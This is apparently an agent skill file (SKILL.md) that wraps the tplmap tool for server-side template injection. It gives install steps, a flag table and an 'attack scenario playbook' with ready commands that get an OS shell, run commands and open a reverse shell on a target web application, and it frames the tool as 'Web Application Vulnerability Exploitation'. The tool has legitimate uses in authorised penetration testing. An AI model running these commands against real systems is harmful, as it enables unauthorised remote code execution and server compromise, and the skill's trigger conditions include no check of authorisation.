---
name: tplmap-ssti
description: "tplmap gets system commands via SSTI and probes sandbox escapes. Signals: web vulnerability, injection, SSTI detection+exploitation, POST"
zh-signals: "tplmap: SSTI 直取系统命令、沙盒逃逸探测。信号:web漏洞,注入,SSTI 检测+利用,POST。"
when-to-use: >-
  Use when a web parameter or POST body may be vulnerable to server-side
  template injection (SSTI) and you want to detect the engine, escape the
  sandbox, and execute OS commands.
---

# tplmap

- Attack Category: C09 Web Application Vulnerability Exploitation
- Upstream Repository: https://github.com/epinna/tplmap
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/epinna/tplmap && cd tplmap && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python tplmap.py -u 'https://t.com/hello?name=john'` | SSTI detection + exploitation |
| `--data='name=john'` | POST |
| `--os-shell` | System shell |
| `--os-cmd=id` | Single command |
| `--reverse-shell host 4444` | Callback |
| `-e jinja2/twig` | Specify the engine |
| `--level 5` | Blind injection depth |

## Attack Scenario Playbook

### Straight to system commands via SSTI

```bash
python tplmap.py -u 'https://target/profile?tpl=hello' --os-shell
# Automatically identifies Jinja2/Twig/Freemarker and other engines and yields RCE
```

### Sandbox escape probing

```bash
python tplmap.py -u URL --level 5  # deep blind mode for scenarios with no output
```

## Notes

Covers 15+ template engines; with Jinja2/Twig you get RCE out of the box, and in sandbox mode use --level to brute force blindly.
